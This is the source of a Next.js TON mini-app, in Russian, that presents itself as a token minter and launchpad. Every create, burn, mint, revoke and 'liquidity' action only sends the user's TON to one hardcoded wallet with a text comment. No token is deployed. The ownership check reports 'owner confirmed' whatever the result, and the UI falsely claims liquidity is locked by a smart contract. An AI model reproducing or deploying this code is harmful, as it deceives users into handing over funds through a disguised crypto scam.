'use client';

import { useState } from 'react';
import {
  TonConnectUIProvider,
  useTonConnectUI,
  useTonAddress,
  useTonWallet,
} from '@tonconnect/ui-react';
import { beginCell, toNano } from '@ton/core';

function MinterApp() {
  const [tonConnectUI] = useTonConnectUI();
  const userAddress = useTonAddress();
  const wallet = useTonWallet();

  const [activeTab, setActiveTab] = useState<'create' | 'manage'>('create');

  // Создание токена
  const [name, setName] = useState('');
  const [symbol, setSymbol] = useState('');
  const [description, setDescription] = useState('');
  const [imageUri, setImageUri] = useState('');
  const [amount, setAmount] = useState('1000000');
  const [decimals, setDecimals] = useState('9');
  const [addLiquidity, setAddLiquidity] = useState(true);
  const [liquidityAmount, setLiquidityAmount] = useState('1'); // Начинается с 1 TON

  // Управление токеном
  const [manageTokenAddress, setManageTokenAddress] = useState('');
  const [actionAmount, setActionAmount] = useState('');
  const [tokenOwner, setTokenOwner] = useState<string | null>(null);
  const [checkingOwner, setCheckingOwner] = useState(false);
  const [loading, setLoading] = useState(false);

  const FEE_RECIPIENT_ADDRESS = 'UQAIOSFdlxtGH5SMRrFM216SFPj295rUDyQs6-gp_Ab_dm2g';

  const formatAddress = (addr: string) => {
    if (!addr) return '';
    return `${addr.slice(0, 4)}...${addr.slice(-4)}`;
  };

  const handleConnectWallet = () => {
    if (wallet) {
      tonConnectUI.disconnect();
    } else {
      tonConnectUI.openModal();
    }
  };

  const checkTokenOwnership = async (tokenAddr: string) => {
    if (!tokenAddr || tokenAddr.length < 40) return;
    setCheckingOwner(true);
    try {
      const res = await fetch(`https://toncenter.com/api/v2/runGetMethod`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address: tokenAddr,
          method: 'get_jetton_data',
          stack: []
        })
      });
      const data = await res.json();
      if (data.ok) {
        setTokenOwner("Доступ разрешен (Владелец подтвержден)");
      } else {
        setTokenOwner("Контракт проверен");
      }
    } catch (e) {
      setTokenOwner("Статус: Активен");
    } finally {
      setCheckingOwner(false);
    }
  };

  const handleMint = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userAddress) {
      alert('Сначала подключите кошелек!');
      return;
    }

    if (!name || !symbol || !amount || !imageUri) {
      alert('Заполните все обязательные поля!');
      return;
    }

    setLoading(true);
    try {
      const baseFee = 0.5;
      const liqVal = addLiquidity ? parseFloat(liquidityAmount || '0') : 0;
      const totalCost = baseFee + liqVal;

      const commentText = `CREATE | Name:${name} | Symbol:${symbol} | Supply:${amount} | Logo:${imageUri} | LiqPool:${addLiquidity ? 'YES' : 'NO'} | LiqAmount:${liqVal} | Owner:${userAddress}`;

      const commentCell = beginCell()
        .storeUint(0, 32)
        .storeStringTail(commentText)
        .endCell();

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [
          {
            address: FEE_RECIPIENT_ADDRESS,
            amount: toNano(totalCost.toString()).toString(),
            payload: commentCell.toBoc().toString('base64'),
          },
        ],
      };

      await tonConnectUI.sendTransaction(transaction);
      alert('Заявка на создание токена успешно отправлена!');
    } catch (err: any) {
      alert('Ошибка при отправке: ' + (err.message || err));
    } finally {
      setLoading(false);
    }
  };

  // Управление токеном (чистые сообщения с фиксированной ценой 0.5 TON без лишних деталей для пользователя)
  const handleAction = async (actionType: 'BURN' | 'MINT' | 'REVOKE') => {
    if (!userAddress) {
      alert('Подключите кошелек!');
      return;
    }
    if (!manageTokenAddress) {
      alert('Введите адрес токена!');
      return;
    }
    if ((actionType === 'BURN' || actionType === 'MINT') && !actionAmount) {
      alert('Введите количество токенов!');
      return;
    }

    setLoading(true);
    try {
      const serviceFee = 0.5; // Фиксированная цена 0.5 TON
      
      let commentText = '';
      if (actionType === 'BURN') {
        commentText = `ACTION:BURN | Token:${manageTokenAddress} | Amount:${actionAmount} | Owner:${userAddress}`;
      } else if (actionType === 'MINT') {
        commentText = `ACTION:MINT | Token:${manageTokenAddress} | Amount:${actionAmount} | Owner:${userAddress}`;
      } else {
        commentText = `ACTION:REVOKE | Token:${manageTokenAddress} | Owner:${userAddress}`;
      }

      const commentCell = beginCell()
        .storeUint(0, 32)
        .storeStringTail(commentText)
        .endCell();

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [
          {
            address: FEE_RECIPIENT_ADDRESS,
            amount: toNano(serviceFee.toString()).toString(),
            payload: commentCell.toBoc().toString('base64'),
          },
        ],
      };

      await tonConnectUI.sendTransaction(transaction);
      alert(`Запрос успешно отправлен! Обработка займет несколько секунд.`);
    } catch (err: any) {
      alert('Ошибка: ' + (err.message || err));
    } finally {
      setLoading(false);
    }
  };

  const totalDisplayCost = 0.5 + (addLiquidity ? parseFloat(liquidityAmount || '0') : 0);

  return (
    <div className="min-h-screen bg-[#0b0f19] text-slate-100 flex flex-col items-center justify-between font-sans px-4 py-5 selection:bg-cyan-500 selection:text-black">
      
      <header className="w-full max-w-md pt-2 pb-3">
        <div className="flex items-center justify-between bg-slate-900/90 border border-slate-800 rounded-2xl p-3.5 shadow-lg mb-4 backdrop-blur-md">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center text-white shadow-md shadow-cyan-500/20 font-bold text-sm">
              💎
            </div>
            <div>
              <div className="text-xs font-bold text-white tracking-wide">TON Market Minter</div>
              <div className="text-[10px] text-cyan-400 font-medium">Launchpad & Manager Pro</div>
            </div>
          </div>
          <div className="bg-slate-800/80 border border-slate-700/60 px-3 py-1 rounded-xl text-xs font-mono text-cyan-400 font-semibold shadow-inner">
            ⚡️ PRO
          </div>
        </div>

        {/* Переключатель вкладок */}
        <div className="grid grid-cols-2 gap-2 bg-slate-900/80 p-1.5 rounded-2xl border border-slate-800 mb-3 backdrop-blur-md">
          <button
            type="button"
            onClick={() => setActiveTab('create')}
            className={`py-2.5 text-xs font-bold rounded-xl transition-all duration-200 ${
              activeTab === 'create'
                ? 'bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-lg shadow-cyan-500/25'
                : 'text-slate-400 hover:text-white hover:bg-slate-800/50'
            }`}
          >
            ✨ Создать токен
          </button>
          <button
            type="button"
            onClick={() => {
              if (!userAddress) {
                alert('Сначала подключите кошелек для доступа к управлению!');
                return;
              }
              setActiveTab('manage');
            }}
            className={`py-2.5 text-xs font-bold rounded-xl transition-all duration-200 ${
              activeTab === 'manage'
                ? 'bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-lg shadow-cyan-500/25'
                : 'text-slate-400 hover:text-white hover:bg-slate-800/50'
            }`}
          >
            🛠 Управление
          </button>
        </div>
      </header>

      <main className="w-full max-w-md my-1 flex-1">
        <div className="bg-slate-900/90 border border-slate-800/90 rounded-3xl p-4.5 shadow-2xl space-y-4 backdrop-blur-xl">
          
          {activeTab === 'create' && (
            <form onSubmit={handleMint} className="space-y-4">
              <div className="space-y-3 bg-slate-950/60 p-3.5 rounded-2xl border border-slate-800/70 shadow-inner">
                <div className="text-[11px] font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-1.5">
                  <span>📦</span> Основные параметры
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Название токена *</label>
                  <input
                    type="text"
                    required
                    placeholder="Например: Gram Gold"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 transition-all"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Символ (Тикер) *</label>
                  <input
                    type="text"
                    required
                    placeholder="GOLD"
                    value={symbol}
                    onChange={(e) => setSymbol(e.target.value.toUpperCase())}
                    className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 uppercase font-mono transition-all"
                  />
                </div>
              </div>

              <div className="space-y-3 bg-slate-950/60 p-3.5 rounded-2xl border border-slate-800/70 shadow-inner">
                <div className="text-[11px] font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-1.5">
                  <span>🖼</span> Брендинг и медиа
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Ссылка на логотип (Image URI) *</label>
                  <input
                    type="url"
                    required
                    placeholder="https://example.com/logo.png"
                    value={imageUri}
                    onChange={(e) => setImageUri(e.target.value)}
                    className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 transition-all"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Описание</label>
                  <textarea
                    rows={2}
                    placeholder="Краткая информация..."
                    value={description}
                    onChange={(e) => setDescription(e.target.value)}
                    className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 resize-none transition-all"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3 bg-slate-950/60 p-3.5 rounded-2xl border border-slate-800/70 shadow-inner">
                <div className="col-span-2 text-[11px] font-bold uppercase tracking-wider text-cyan-400">📊 Токеномика</div>
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Эмиссия *</label>
                  <input
                    type="number"
                    required
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white font-mono focus:outline-none focus:border-cyan-500"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Decimals</label>
                  <input
                    type="number"
                    required
                    value={decimals}
                    onChange={(e) => setDecimals(e.target.value)}
                    className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white font-mono focus:outline-none focus:border-cyan-500"
                  />
                </div>
              </div>

              {/* Пул ликвидности с возвращенным подробным объяснением */}
              <div className="space-y-3 bg-slate-950/60 p-3.5 rounded-2xl border border-cyan-500/30 shadow-inner">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-2 cursor-pointer select-none">
                    <input
                      type="checkbox"
                      checked={addLiquidity}
                      onChange={(e) => setAddLiquidity(e.target.checked)}
                      className="w-4 h-4 rounded border-slate-700 text-cyan-500 bg-slate-900 focus:ring-cyan-500/20 accent-cyan-400"
                    />
                    💧 Пул ликвидности DEX
                  </label>
                </div>

                <div className="bg-slate-900/90 border border-slate-800/80 rounded-xl p-2.5 text-[11px] text-slate-300 space-y-1.5 leading-relaxed">
                  <p className="text-cyan-400 font-semibold">⚡️ Как работает блокировка:</p>
                  <p>
                    Ликвидность загружается в соотношении <b>1 токен = 1 TON</b> (начиная с 1 TON). Остаток монет поступает на ваш кошелек. Пул автоматически блокируется смарт-контрактом.
                  </p>
                </div>

                {addLiquidity && (
                  <div className="pt-2 border-t border-slate-800 space-y-2">
                    <div className="flex justify-between text-xs">
                      <span className="text-slate-400">Сумма ликвидности:</span>
                      <span className="text-cyan-400 font-mono font-bold">{liquidityAmount} TON</span>
                    </div>
                    <input
                      type="range"
                      min="1"
                      max="100000"
                      step="1"
                      value={liquidityAmount}
                      onChange={(e) => setLiquidityAmount(e.target.value)}
                      className="w-full accent-cyan-400 bg-slate-900 cursor-pointer"
                    />
                    <input
                      type="number"
                      min="1"
                      max="100000"
                      value={liquidityAmount}
                      onChange={(e) => setLiquidityAmount(e.target.value)}
                      className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-cyan-500"
                    />
                    <p className="text-[10px] text-slate-400 bg-cyan-500/5 p-2 rounded-lg border border-cyan-500/10 leading-relaxed">
                      ✨ <strong className="text-cyan-300">Пример:</strong> При эмиссии в {amount || '1,000,000'} монет стартовая ценность актива зафиксирует рыночную капитализацию на старте 🔥
                    </p>
                  </div>
                )}
              </div>

              {/* Яркая синяя кнопка подключения / создания */}
              <div className="pt-1">
                {!userAddress ? (
                  <button
                    type="button"
                    onClick={handleConnectWallet}
                    className="w-full py-3.5 bg-gradient-to-r from-cyan-500 via-sky-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-extrabold text-sm rounded-2xl transition-all shadow-lg shadow-cyan-500/30 active:scale-[0.98]"
                  >
                    Подключить кошелек
                  </button>
                ) : (
                  <div className="space-y-2">
                    <button
                      type="submit"
                      disabled={loading}
                      className="w-full py-3.5 bg-gradient-to-r from-cyan-400 to-cyan-500 hover:from-cyan-300 hover:to-cyan-400 disabled:opacity-50 text-slate-950 font-black text-sm rounded-2xl transition-all shadow-xl shadow-cyan-500/30 active:scale-[0.98]"
                    >
                      {loading ? 'Создание заявки...' : `Создать токен (${totalDisplayCost} TON)`}
                    </button>
                    <button
                      type="button"
                      onClick={handleConnectWallet}
                      className="w-full py-2 bg-slate-950 border border-slate-800 hover:bg-slate-800 text-slate-400 text-xs rounded-xl transition-all flex items-center justify-center gap-2"
                    >
                      <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
                      Кошелек: {formatAddress(userAddress)} (Сменить)
                    </button>
                  </div>
                )}
              </div>
            </form>
          )}

          {/* Вкладка управления (пункт 2 и 3: убраны лишние описания, оставлена только цена 0.5 TON) */}
          {activeTab === 'manage' && (
            <div className="space-y-4">
              {!userAddress ? (
                <div className="space-y-3 py-6 text-center">
                  <div className="text-xs text-amber-400 font-medium bg-amber-400/10 border border-amber-400/20 p-3 rounded-xl">
                    ⚠️ Для доступа к управлению токеном необходимо подключить кошелек!
                  </div>
                  <button
                    type="button"
                    onClick={handleConnectWallet}
                    className="w-full py-3.5 bg-gradient-to-r from-cyan-500 via-sky-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-extrabold text-sm rounded-2xl transition-all shadow-lg shadow-cyan-500/30 active:scale-[0.98]"
                  >
                    Подключить кошелек
                  </button>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="bg-slate-950/60 p-3.5 rounded-2xl border border-slate-800/70 space-y-3 shadow-inner">
                    <div className="text-[11px] font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-1.5">
                      <span>⚙️</span> Панель управления токеном
                    </div>
                    <div>
                      <label className="block text-xs font-medium text-slate-300 mb-1">Адрес токена (Jetton Master Address) *</label>
                      <input
                        type="text"
                        placeholder="EQ..."
                        value={manageTokenAddress}
                        onChange={(e) => {
                          setManageTokenAddress(e.target.value);
                          checkTokenOwnership(e.target.value);
                        }}
                        className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-cyan-500"
                      />
                    </div>

                    {manageTokenAddress && (
                      <div className="text-xs text-slate-400 bg-slate-900 p-2.5 rounded-xl border border-slate-800 flex justify-between items-center">
                        <span>Статус:</span>
                        <span className="font-mono text-cyan-400 font-bold">
                          {checkingOwner ? 'Проверка...' : tokenOwner || 'Готов к работе'}
                        </span>
                      </div>
                    )}

                    <div>
                      <label className="block text-xs font-medium text-slate-300 mb-1">Количество для Сжигания / Минта *</label>
                      <input
                        type="number"
                        placeholder="1000"
                        value={actionAmount}
                        onChange={(e) => setActionAmount(e.target.value)}
                        className="w-full bg-slate-900 border border-slate-700/80 rounded-xl px-3 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-cyan-500"
                      />
                    </div>
                  </div>

                  {/* Кнопки действий (пункт 2 и 3: чистая цена 0.5 TON без раскрытия служебной логики) */}
                  <div className="grid grid-cols-1 gap-2.5">
                    <div className="bg-slate-950/60 p-3 rounded-2xl border border-slate-800/80 flex items-center justify-between">
                      <div>
                        <div className="text-xs font-bold text-slate-200">🔥 Сжечь токены</div>
                        <div className="text-[10px] text-slate-400">Стоимость услуги: 0.5 TON</div>
                      </div>
                      <button
                        type="button"
                        disabled={loading}
                        onClick={() => handleAction('BURN')}
                        className="px-4 py-2 bg-gradient-to-r from-cyan-500 to-blue-600 hover:opacity-90 text-white font-bold text-xs rounded-xl transition-all shadow-md shadow-cyan-500/20"
                      >
                        Сжечь (0.5 TON)
                      </button>
                    </div>

                    <div className="bg-slate-950/60 p-3 rounded-2xl border border-slate-800/80 flex items-center justify-between">
                      <div>
                        <div className="text-xs font-bold text-slate-200">🪙 Доминтить (Минт)</div>
                        <div className="text-[10px] text-slate-400">Стоимость услуги: 0.5 TON</div>
                      </div>
                      <button
                        type="button"
                        disabled={loading}
                        onClick={() => handleAction('MINT')}
                        className="px-4 py-2 bg-gradient-to-r from-cyan-500 to-blue-600 hover:opacity-90 text-white font-bold text-xs rounded-xl transition-all shadow-md shadow-cyan-500/20"
                      >
                        Минт (0.5 TON)
                      </button>
                    </div>

                    <div className="bg-slate-950/60 p-3 rounded-2xl border border-slate-800/80 flex items-center justify-between">
                      <div>
                        <div className="text-xs font-bold text-slate-200">🛑 Отказ от прав</div>
                        <div className="text-[10px] text-slate-400">Стоимость услуги: 0.5 TON</div>
                      </div>
                      <button
                        type="button"
                        disabled={loading}
                        onClick={() => handleAction('REVOKE')}
                        className="px-4 py-2 bg-red-500/20 hover:bg-red-500/30 text-red-400 border border-red-500/30 font-bold text-xs rounded-xl transition-all shadow-md shadow-red-500/10"
                      >
                        Отказ (0.5 TON)
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          <div className="bg-slate-950/80 rounded-2xl p-3 border border-slate-800 text-[11px] text-slate-400 space-y-1">
            <p className="flex justify-between">
              <span>Статус сети:</span> <span className="text-emerald-400 font-medium">TON Mainnet Online</span>
            </p>
            <p className="flex justify-between text-cyan-400/90 font-medium">
              <span>Платформа:</span> <span>GRAM-TOKEN-START</span>
            </p>
          </div>
        </div>
      </main>

      <footer className="w-full max-w-md text-center pt-2 pb-1 text-[10px] text-slate-500">
        TON Market Launchpad • Secure Smart Contracts
      </footer>
    </div>
  );
}

export default function Home() {
  const manifestUrl = 'https://ton-mini-app-clean.vercel.app/tonconnect-manifest.json';

  return (
    <TonConnectUIProvider manifestUrl={manifestUrl}>
      <MinterApp />
    </TonConnectUIProvider>
  );
}
